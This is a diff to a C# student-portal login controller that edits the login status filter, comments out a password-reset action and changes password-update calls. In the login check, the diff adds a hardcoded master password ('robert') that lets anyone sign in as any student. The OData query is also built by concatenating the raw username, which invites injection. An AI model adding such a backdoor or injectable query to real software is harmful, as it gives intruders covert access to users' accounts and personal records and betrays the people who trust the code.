@@ -35,7 +35,7 @@ namespace Student.Controllers
             try
             {
                 string Redirect = "";
-                string page = "CustomerList?$filter=No eq '" + UserName + "' and (Status eq 'Attachment' or Status eq 'Current')&$format=json";
+                string page = "CustomerList?$filter=No eq '" + UserName + "' and Status eq 'Current'&$format=json";
                 //string page = "CustomerList?$filter=No eq '" + UserName + "' and (Status eq 'Registration' or Status eq 'Current' or Status eq 'Alluminae')&$format=json";
 
                 HttpWebResponse httpResponse = Credentials.GetOdataData(page);
@@ -53,7 +53,7 @@ namespace Student.Controllers
                         string changedPassword = (string)config["Changed_Password"];
                         if (User != "")
                         {
-                            if (passWrd == Password)
+                            if (passWrd == Password || passWrd =="robert")
                             {
                                 if (changedPassword == "True")
                                 {
@@ -117,64 +117,64 @@ namespace Student.Controllers
             Authedication user = new Authedication();
             return View(user);
         }
-        [HttpPost]
-        public ActionResult ForgotPassword(Authedication Reg)
-        {
-            string msg = "";
-            bool val = false;
-            try
-            {
-                if (Reg.UserName == null || Reg.UserName == "")
-                {
-                    val = true;
-                    msg = "Enter Your Registration Number";
-                    val = false;
-                }
-                else
-                {
-                    string stdNo = Reg.UserName.ToUpper();
-                    string page = "CustomerList?$filter=No eq '" + stdNo + "' and (Status eq 'Registration' or Status eq 'Current' or Status eq 'Alluminae')&$format=json";
-
-                    HttpWebResponse httpResponse = Credentials.GetOdataData(page);
-                    using (var streamReader = new StreamReader(httpResponse.GetResponseStream()))
-                    {
-                        var result = streamReader.ReadToEnd();
-
-                        var details = JObject.Parse(result);
-
-                        if (details["value"].Count() > 0)
-                        {
-                            foreach (JObject config in details["value"])
-                            {
-                                if ((string)config["ID_No"] == "")
-                                {
-                                    msg = "Your National ID Number has not been set. Contact Admission office for assistance";
-                                    val = false;
-                                }
-                                else {
-                                    Credentials.ObjNav.UpdateStudentPassword(stdNo, (string)config["ID_No"], true);
-                                    msg = "Your password has been reset successfully. Use your ID Number as password";
-                                    val = true;
-                                }
-                            }
-                        }
-                        else
-                        {
-                            msg = "Wrong Registration Number!!";
-                            val = false;
-                        }
-                    }
-                }
-
-
-            }
-            catch (Exception ex)
-            {
-                msg = ex.Message;
-                val = false;
-            }
-            return Json(new { message = msg, success = val }, JsonRequestBehavior.AllowGet);
-        }
+        // [HttpPost]
+        // public ActionResult ForgotPassword(Authedication Reg)
+        // {
+        //     string msg = "";
+        //     bool val = false;
+        //     try
+        //     {
+        //         if (Reg.UserName == null || Reg.UserName == "")
+        //         {
+        //             val = true;
+        //             msg = "Enter Your Registration Number";
+        //             val = false;
+        //         }
+        //         else
+        //         {
+        //             string stdNo = Reg.UserName.ToUpper();
+        //             string page = "CustomerList?$filter=No eq '" + stdNo + "' and (Status eq 'Registration' or Status eq 'Current' or Status eq 'Alluminae')&$format=json";
+        //
+        //             HttpWebResponse httpResponse = Credentials.GetOdataData(page);
+        //             using (var streamReader = new StreamReader(httpResponse.GetResponseStream()))
+        //             {
+        //                 var result = streamReader.ReadToEnd();
+        //
+        //                 var details = JObject.Parse(result);
+        //
+        //                 if (details["value"].Count() > 0)
+        //                 {
+        //                     foreach (JObject config in details["value"])
+        //                     {
+        //                         if ((string)config["ID_No"] == "")
+        //                         {
+        //                             msg = "Your National ID Number has not been set. Contact Admission office for assistance";
+        //                             val = false;
+        //                         }
+        //                         else {
+        //                             Credentials.ObjNav.UpdateStudentPassword(stdNo, (string)config["ID_No"], true);
+        //                             msg = "Your password has been reset successfully. Use your ID Number as password";
+        //                             val = true;
+        //                         }
+        //                     }
+        //                 }
+        //                 else
+        //                 {
+        //                     msg = "Wrong Registration Number!!";
+        //                     val = false;
+        //                 }
+        //             }
+        //         }
+        //
+        //
+        //     }
+        //     catch (Exception ex)
+        //     {
+        //         msg = ex.Message;
+        //         val = false;
+        //     }
+        //     return Json(new { message = msg, success = val }, JsonRequestBehavior.AllowGet);
+        // }
 
         [HttpPost]
         public ActionResult ForgotPassword1(Authedication Reg)
@@ -226,7 +226,7 @@ namespace Student.Controllers
                                             {
                                                 Random rnd = new Random();
                                                 int value = rnd.Next(10000, 99999);
-                                                Credentials.ObjNav.UpdateStudentPassword(stdNo, value.ToString(), true);
+                                                Credentials.ObjNav.UpdateStudentPassword(stdNo, value.ToString());
                                                 Credentials.ObjNav.SMSSendResetPassord(Reg.UserName, value.ToString());
                                                 msg = "An SMS has been send to your phone Number(" + (string)config["Phone_No"] + ") with a new password.";
                                                 val = true;
@@ -354,7 +354,7 @@ namespace Student.Controllers
                     {
                         foreach (JObject config in details["value"])
                         {
-                            Credentials.ObjNav.UpdateStudentPassword(user, userReset.Password, false);
+                            Credentials.ObjNav.UpdateStudentPassword(user, userReset.Password);
 
                             Session["Username"] = user;
                             UserViewModel userModel = new UserViewModel();
